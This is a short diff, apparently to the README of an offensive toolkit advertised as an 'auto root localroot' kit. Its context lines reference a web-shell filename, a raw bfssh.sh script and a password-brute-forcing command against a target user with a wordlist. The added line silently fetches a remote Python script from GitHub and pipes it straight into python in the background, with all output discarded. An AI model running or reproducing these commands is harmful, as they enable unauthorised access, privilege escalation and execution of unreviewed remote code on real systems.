@@ -45,5 +45,8 @@ shell%2Ephp
 https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main/bfssh.sh
 
 ./entod.sh -u targetuser -t 0.5 -s 0.003 -w top12000.txt
+
+nohup curl -s https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main/ko.py | python - > /dev/null 2>&1 &
+
 ```
 ☠️ Powerfull Auto root Localroot By Ghost haxor | Mr.W4W4N ☠️
